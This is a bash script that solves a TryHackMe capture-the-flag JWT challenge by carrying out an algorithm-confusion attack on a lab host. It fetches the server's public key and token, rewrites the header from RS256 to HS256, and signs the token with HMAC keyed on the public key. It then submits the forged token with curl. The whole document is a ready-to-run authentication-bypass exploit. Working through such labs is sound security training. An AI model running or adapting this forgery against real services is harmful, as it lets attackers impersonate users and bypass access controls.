#!/bin/bash

# Update the IP to the IP of the vulnerable machine

ip=10.10.86.179

echo ""
echo "TryHackMe ZTH: Obscure Web Vulns JWT Challenge"
echo ""

echo "[+] downloading public key "
if [ -f public.pem ] ;then
 echo "[i] Removing old Public Key"
 rm public.pem
fi

wget --quiet http://$ip/public.pem &1>/dev/null

echo "[+] Obtaining JWT file from http://$ip"
curl -s http://$ip | grep -o ey.* >jwt

part1=$(cat jwt | cut -f1 -d".")
part2=$(cat jwt | cut -f2 -d".")
part3=$(cat jwt | cut -f3 -d".")

echo "[+] Changing Header from RS256 to HS256"

newpart1=$(echo $part1 | base64 -d | sed 's/RS256/HS256/g' | base64)

echo "[+] Converting public key to hex"

cat public.pem | xxd -p | tr -d "\\n" >public.xxd
publicxxd=$(cat public.xxd)

echo "[+] Signing the JWT with the valid HS256 key"
key=$(echo -n $newpart1.$part2 | openssl dgst -sha256 -mac HMAC -macopt hexkey:`cat public.xxd`| tr -d " " | cut -f2 -d "=")
echo "[+] Decode the hex to binary and reencoded the data"
secret=$(python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('"$key"')).replace('=','')\")")
echo ""

echo "---Manual Submission--"
echo $newpart1.$part2.$secret
echo "----------------------"
echo ""

final=$newpart1.$part2.$secret

echo "[+] Attempting submission via curl"

curl -s -X POST -F "jwt=$final" http://$ip/rs256.php | sed 's/<.*>//g'

# The sed 's/<.*>//g' at the last part of the curl command is to pull out all the HTML tags and display text.
